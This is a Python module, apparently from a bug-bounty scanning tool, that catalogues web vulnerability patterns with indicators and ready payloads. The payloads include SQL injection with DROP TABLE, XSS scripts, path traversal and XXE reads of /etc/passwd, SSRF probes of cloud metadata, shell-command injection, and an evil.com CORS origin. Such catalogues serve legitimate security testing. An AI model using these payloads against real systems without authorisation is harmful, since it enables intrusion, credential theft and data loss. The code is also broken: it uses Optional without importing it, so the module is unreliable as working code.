"""
BugBountyAgent - Vulnerability Patterns
=========================================
Database of vulnerability patterns for detection.
"""

from typing import List, Dict, Any


class PatternDatabase:
    """
    Database of vulnerability patterns.
    """
    
    PATTERNS = {
        'sql_injection': {
            'name': 'SQL Injection',
            'severity': 'critical',
            'indicators': [
                'sql', 'syntax error', 'mysql_fetch', 'odbc',
                'ora-', 'postgresql', 'sqlite', 'unclosed quotation',
                'mysql', 'sqlstate', 'microsoft ole db', 'db2'
            ],
            'payloads': [
                "' OR '1'='1", "' OR 1=1--", "'; DROP TABLE users; --",
                "1 AND 1=1", "1 AND 1=2", "UNION SELECT"
            ]
        },
        'xss': {
            'name': 'Cross-Site Scripting (XSS)',
            'severity': 'high',
            'indicators': [
                '<script>', 'alert(', 'onerror=', 'onload=',
                'javascript:', '<img', '<iframe', 'onmouseover='
            ],
            'payloads': [
                '<script>alert("XSS")</script>',
                '"><script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>'
            ]
        },
        'path_traversal': {
            'name': 'Path Traversal',
            'severity': 'high',
            'indicators': [
                '../', '..\\', 'etc/passwd', 'windows\\win.ini',
                'boot.ini', 'root:', 'shadow:', 'web.config'
            ],
            'payloads': [
                '../../../../etc/passwd',
                '..\\..\\..\\windows\\win.ini',
                '....//....//....//etc/passwd'
            ]
        },
        'ssrf': {
            'name': 'Server-Side Request Forgery (SSRF)',
            'severity': 'high',
            'indicators': [
                '169.254.169.254', 'latest/meta-data', '127.0.0.1',
                'localhost', '0.0.0.0', 'instance-id', 'user-data'
            ],
            'payloads': [
                'http://169.254.169.254/latest/meta-data/',
                'http://localhost:8080/',
                'http://127.0.0.1/'
            ]
        },
        'xxe': {
            'name': 'XML External Entity (XXE)',
            'severity': 'critical',
            'indicators': [
                'file://', 'etc/passwd', 'windows/win.ini',
                '<!DOCTYPE', '<!ENTITY', 'SYSTEM', 'PUBLIC'
            ],
            'payloads': [
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]>'
            ]
        },
        'idor': {
            'name': 'Insecure Direct Object Reference (IDOR)',
            'severity': 'high',
            'indicators': [
                'id=', 'user_id=', 'file=', 'document=',
                'order=', 'invoice=', 'account='
            ],
            'payloads': [
                '?id=1', '?id=2', '?id=admin', '?user_id=1'
            ]
        },
        'rce': {
            'name': 'Remote Code Execution (RCE)',
            'severity': 'critical',
            'indicators': [
                'system()', 'eval()', 'exec()', 'shell_exec',
                'passthru', 'popen', 'proc_open', 'backticks'
            ],
            'payloads': [
                '; ls', '| whoami', '&& id', '`cat /etc/passwd`'
            ]
        },
        'auth_bypass': {
            'name': 'Authentication Bypass',
            'severity': 'critical',
            'indicators': [
                'login', 'auth', 'authenticate', 'signin',
                'session', 'cookie', 'token', 'jwt'
            ],
            'payloads': [
                'admin\' OR 1=1--',
                'admin" OR "1"="1',
                'admin\'; DROP TABLE users; --'
            ]
        },
        'cors': {
            'name': 'CORS Misconfiguration',
            'severity': 'medium',
            'indicators': [
                'Access-Control-Allow-Origin', 'cross-origin',
                'cors', 'origin'
            ],
            'payloads': [
                'Origin: http://evil.com',
                'Access-Control-Request-Method: GET'
            ]
        }
    }
    
    def get_pattern(self, pattern_id: str) -> Optional[Dict]:
        """Get a pattern by ID."""
        return self.PATTERNS.get(pattern_id)
    
    def get_all_patterns(self) -> Dict[str, Dict]:
        """Get all patterns."""
        return self.PATTERNS
    
    def search_by_indicator(self, indicator: str) -> List[Dict]:
        """Search patterns by indicator."""
        results = []
        for pattern_id, pattern in self.PATTERNS.items():
            if any(indicator.lower() in i.lower() for i in pattern.get('indicators', [])):
                results.append({**pattern, 'id': pattern_id})
        return results
    
    def get_patterns_by_severity(self, severity: str) -> List[Dict]:
        """Get patterns by severity."""
        results = []
        for pattern_id, pattern in self.PATTERNS.items():
            if pattern.get('severity') == severity:
                results.append({**pattern, 'id': pattern_id})
        return results